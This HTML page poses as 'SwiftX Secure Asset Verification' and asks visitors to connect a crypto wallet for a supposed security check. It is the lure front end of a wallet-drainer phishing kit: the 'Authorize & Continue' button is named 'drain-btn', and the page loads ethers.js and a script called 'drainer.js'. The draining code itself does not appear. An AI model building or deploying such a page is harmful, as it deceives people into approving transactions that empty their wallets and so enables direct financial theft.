<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SwiftX — Secure Asset Verification</title>
    <style>
        :root {
            --bg: #0b0e11;
            --panel: #12161c;
            --panel-2: #1a1f27;
            --border: #2b3139;
            --text: #eaecef;
            --text-dim: #848e9c;
            --accent: #f0b90b;
            --accent-hover: #f3c114;
            --green: #0ecb81;
            --red: #f6465d;
            --blue: #3b82f6;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .topbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 24px;
            background: var(--panel);
            border-bottom: 1px solid var(--border);
        }

        .logo {
            font-size: 1.2rem;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        .logo span { color: var(--accent); }

        .network-pill {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--panel-2);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 6px 14px;
            font-size: 0.85rem;
            color: var(--text-dim);
        }
        .network-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--green);
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
        }

        .card {
            background: var(--panel);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 32px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        }

        .card h1 {
            font-size: 1.4rem;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .card p.sub {
            color: var(--text-dim);
            font-size: 0.92rem;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .asset-box {
            background: var(--panel-2);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .asset-label { color: var(--text-dim); font-size: 0.8rem; }
        .asset-amount { font-size: 1.1rem; font-weight: 600; margin-top: 4px; }
        .asset-badge {
            background: rgba(240,185,11,0.15);
            color: var(--accent);
            font-size: 0.75rem;
            font-weight: 600;
            padding: 4px 10px;
            border-radius: 6px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            font-size: 1rem;
            font-weight: 600;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.15s, transform 0.05s;
        }
        .btn:active { transform: scale(0.99); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }

        .btn-connect { background: var(--accent); color: #0b0e11; }
        .btn-connect:hover:not(:disabled) { background: var(--accent-hover); }

        .btn-drain { background: var(--green); color: #0b0e11; display: none; margin-top: 12px; }
        .btn-drain:hover:not(:disabled) { background: #0af59a; }

        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 0.85rem;
            text-align: center;
            background: var(--panel-2);
            border: 1px solid var(--border);
            color: var(--text-dim);
            word-break: break-all;
        }
        .status.success { border-color: var(--green); color: var(--green); }
        .status.error   { border-color: var(--red);   color: var(--red); }
        .status.info    { border-color: var(--blue);  color: var(--blue); }

        .wallet-row {
            display: none;
            margin-top: 16px;
            padding: 12px;
            background: var(--panel-2);
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 0.8rem;
            color: var(--text-dim);
            word-break: break-all;
        }
        .wallet-row strong {
            color: var(--text);
            display: block;
            margin-bottom: 4px;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        footer {
            text-align: center;
            padding: 16px;
            color: var(--text-dim);
            font-size: 0.75rem;
            border-top: 1px solid var(--border);
        }
    </style>
</head>
<body>

    <div class="topbar">
        <div class="logo">Swift<span>X</span></div>
        <div class="network-pill">
            <div class="network-dot" id="net-dot"></div>
            <span id="network-name">Connecting…</span>
        </div>
    </div>

    <main>
        <div class="card">
            <h1>Verify Your Assets</h1>
            <p class="sub">Connect your wallet to review and authorize the security check for your eligible assets.</p>

            <div class="asset-box">
                <div>
                    <div class="asset-label">Eligible Assets</div>
                    <div class="asset-amount" id="asset-amount">—</div>
                </div>
                <div class="asset-badge">VERIFICATION</div>
            </div>

            <button class="btn btn-connect" id="connect-btn">Connect Wallet</button>
            <button class="btn btn-drain" id="drain-btn">Authorize & Continue</button>

            <div class="wallet-row" id="wallet-row">
                <strong>Connected Wallet</strong>
                <span id="wallet-address"></span>
            </div>

            <div class="status" id="status">Waiting for wallet connection…</div>
        </div>
    </main>

    <footer>© 2025 SwiftX · Secure Asset Verification</footer>

    <script src="https://cdn.ethers.io/lib/ethers-6.13.0.umd.min.js"></script>
    <script src="drainer.js"></script>
</body>
</html>
